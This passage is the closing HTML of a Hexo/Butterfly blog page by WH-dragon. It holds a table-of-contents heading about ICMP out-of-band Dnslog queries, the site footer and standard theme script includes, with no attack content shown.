href="#%E5%AE%9E%E9%99%85%E6%A1%88%E4%BE%8B-4%EF%BC%9A%E9%98%B2%E7%81%AB%E5%A2%99%E7%BB%84%E5%90%88%E6%95%B0%E6%8D%AE%E4%B8%8D%E5%9B%9E%E6%98%BE-ICMP-%E5%B8%A6%E5%A4%96%E6%9F%A5%E8%AF%A2-Dnslog"><span class="toc-text">实际案例 4：防火墙组合数据不回显-ICMP 带外查询 Dnslog</span></a></li></ol></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 By WH-dragon</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hi! Welcome TO My Blog!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/click-heart.min.js" async="async" mobile="true"></script></div></body></html>
